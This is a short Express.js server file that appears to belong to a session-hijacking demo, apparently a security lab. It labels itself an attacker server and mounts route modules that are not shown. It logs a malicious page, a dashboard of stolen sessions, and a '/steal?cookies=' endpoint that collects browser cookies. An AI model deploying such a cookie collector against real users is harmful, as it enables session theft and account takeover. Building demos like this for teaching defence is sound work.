const express = require("express");
const attackRoutes = require("./routes/attackRoutes");
const dashboardRoutes = require("./routes/dashboardRoutes");

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use("/", attackRoutes);
app.use("/", dashboardRoutes);

const PORT = 4000;
app.listen(PORT, () => {
  console.log(`\n💀 ATTACKER SERVER running at http://localhost:${PORT}`);
  console.log(`   Malicious page:    http://localhost:${PORT}/`);
  console.log(`   Stolen sessions:   http://localhost:${PORT}/stolen-sessions`);
  console.log(
    `   Steal endpoint:    http://localhost:${PORT}/steal?cookies=...\n`,
  );
});
